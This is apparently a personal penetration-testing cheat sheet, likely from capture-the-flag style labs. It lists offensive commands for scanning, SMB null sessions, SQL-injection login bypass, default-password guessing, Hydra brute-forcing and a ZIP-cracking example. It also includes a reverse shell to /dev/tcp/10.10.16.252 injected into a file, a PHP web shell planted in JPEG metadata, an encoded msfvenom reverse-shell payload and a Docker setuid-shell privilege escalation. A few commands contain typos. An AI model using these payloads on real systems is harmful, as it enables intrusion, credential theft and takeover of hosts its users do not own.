# Usefull Commands

## Search for up hosts
```bash
nmap -sn 10.129.150.229
```

## Search for port and service Version
```bash
nmap -sV -p 80 10.129.150.229
```

## Fast Search for common ports
```bash
nmap -F 10.129.150.229
```

## Uses common scripts with Scan
nmap -sC 10.129.155.61

## FTP with anonymous account
```bash
ftp 10.129.150.226
Connected to 10.129.150.226.
220 (vsFTPd 3.0.3)
Name (10.129.150.226:kali): anonymous
331 Please specify the password.
Password: (Password can be anything)
```

## Access SMB unauthenticated
```bash
mbclient -L 10.129.150.229 -U " "%" "
smbclient \\\\10.129.150.229\\WorkShares -U " "%" "
```

## RDP with xfreerdp
```bash
xfreerdp -u:Administrator -v:10.129.150.233
```

## Enumerate Dir Busting
```bash
gobuster dir -u http://10.129.150.236/ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.129.155.61/ -w /usr/share/wordlists/dirb/common.txt -x php
```

## SQL Injection with PHP
admin'# will comment code in PHP
for example when set out like below
```php
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
```

## Connect to SQL
```bash
sql -u root -h 10.129.150.236
```

## Common Passwords
|username|password|
|---|---|
|admin|admin123|
|admin|root123|
|admin|password1|
|admin|administrator1|
|admin|changeme1|
|admin|password123|
|admin|qwerty123|
|admin|administrator123|
|admin|changeme123|
|admin|admin|
|guest|guest|
|user|user|
|root|root|
|administrator|password|

## Initiate bash from reverse shell with python
python3 -c "import pty;pty.spawn('/bin/bash')"

## Inject reverse shell into file owned by a user
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.252/1234 0>&1' #" >> hackers

## Kerberos Enumeration
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'

## HTTP Brute Forcing
```bash
target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
```

## RPC / NetBios / SMB
```bash
rpcinfo -p $TARGET
nbtscan $TARGET
```
### list shares
```bash
smbclient -L //$TARGET -U ""
```

### null session
```bash
rpcclient -U "" $TARGET
smbclient -L //$TARGET
enum4linux $TARGET
```

## SMTP User Enumeration
```bash
smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
```

## Injecting PHP into JPEG
```bash
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
```

## Cracking Web Forums with Hydra
```bash
hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list
```

## Cracking Common Protocols with Hydra
```bash
hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
```

## MSFVenom 
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

## Cracking ZIP files
```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
```

## Docker Priv Esclation
```bash
echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
```
